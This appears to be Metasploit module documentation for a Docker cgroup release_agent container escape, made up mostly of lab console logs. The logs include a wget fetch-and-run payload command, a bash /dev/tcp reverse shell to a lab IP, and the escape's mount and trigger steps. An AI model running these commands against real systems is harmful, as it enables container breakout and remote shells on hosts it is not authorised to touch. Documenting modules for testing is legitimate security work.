## Vulnerable Application

Instructions to get the vulnerable application. If applicable, include links to the vulnerable install
files, as well as instructions on installing/configuring the environment if it is different than a
standard install. Much of this will come from the PR, and can be copy/pasted.

### Docker Setup

`sudo docker run --rm -it --privileged ubuntu:20.04 bash`

You may want to install `wget` to make initial exploitation easier as well:

```
apt-get update
apt-get install -y wget
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use [module path]`
1. Do: `run`
1. You should get a shell on teh host OS.

## Options

## Scenarios

### Ubuntu 18.04 LTS with 4.15.0-96-generic kernel and Docker Ubuntu 20.04

Initial Access

```
resource (docker.rb)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (docker.rb)> set lhost 192.168.2.128
lhost => 192.168.2.128
resource (docker.rb)> set srvport 8181
srvport => 8181
resource (docker.rb)> set target 7
target => 7
resource (docker.rb)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (docker.rb)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.2.128:4444 
[*] Using URL: http://192.168.2.128:8181/QZWpVr8t
[*] Server started.
[*] Run the following command on the target machine:
wget -qO dLFtachL --no-check-certificate http://192.168.2.128:8181/QZWpVr8t; chmod +x dLFtachL; ./dLFtachL& disown
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) > 
[*] 192.168.2.142    web_delivery - Delivering Payload (250 bytes)
[*] Sending stage (3045380 bytes) to 192.168.2.142
[*] Meterpreter session 1 opened (192.168.2.128:4444 -> 192.168.2.142:60288) at 2023-11-28 13:38:39 -0500

[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/) > getuid
Server username: root
(Meterpreter 1)(/) > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 20.04 (Linux 4.15.0-96-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

Exploit the Docker Escape

```
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > use exploit/linux/local/docker_cgroup_escape
[*] Using configured payload cmd/unix/reverse_bash
[msf](Jobs:1 Agents:1) exploit(linux/local/docker_cgroup_escape) > set lhost 192.168.2.128
lhost => 192.168.2.128
[msf](Jobs:1 Agents:1) exploit(linux/local/docker_cgroup_escape) > set lport 9988
lport => 9988
[msf](Jobs:1 Agents:1) exploit(linux/local/docker_cgroup_escape) > set verbose true
verbose => true
[msf](Jobs:1 Agents:1) exploit(linux/local/docker_cgroup_escape) > set session 1
session => 1
[msf](Jobs:1 Agents:1) exploit(linux/local/docker_cgroup_escape) > run

[+] bash -c '0<&119-;exec 119<>/dev/tcp/192.168.2.128/9988;sh <&119 >&119 2>&119'
[*] Started reverse TCP handler on 192.168.2.128:9988 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Unable to determine host OS, this check method is unlikely to be accurate
[+] The target is vulnerable. IF host OS is Ubuntu, kernel version 4.15.0-96-generic is vulnerable
[*] Creating folder for mount: /tmp/2YwVP2oT
[*] Creating directory /tmp/2YwVP2oT
[*] /tmp/2YwVP2oT created
[*] Mounting cgroup
[*] Creating folder in cgroup for exploitation: /tmp/2YwVP2oT/Fm9TGx9u
[*] Creating directory /tmp/2YwVP2oT/Fm9TGx9u
[*] /tmp/2YwVP2oT/Fm9TGx9u created
[*] Enabling notify on release for group Fm9TGx9u
[*] Determining the host OS path for image
[*] Host OS path for image: /var/lib/docker/overlay2/36581ed54878bb921fc79b1bbabef2839159544353837e0bbf8b98e49bb16e3d/diff
[*] Setting release_agent path to: /var/lib/docker/overlay2/36581ed54878bb921fc79b1bbabef2839159544353837e0bbf8b98e49bb16e3d/diff/tmp/TAPu7Lsjq
[*] Uploading payload to /tmp/TAPu7Lsjq
[*] Writing '/tmp/TAPu7Lsjq' (72 bytes) ...
[*] Triggering payload
sh -c "echo $$ > /tmp/2YwVP2oT/Fm9TGx9u/cgroup.procs"

[*] Cleanup: Unmounting /tmp/2YwVP2oT
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:1) exploit(linux/local/docker_cgroup_escape) > 
```
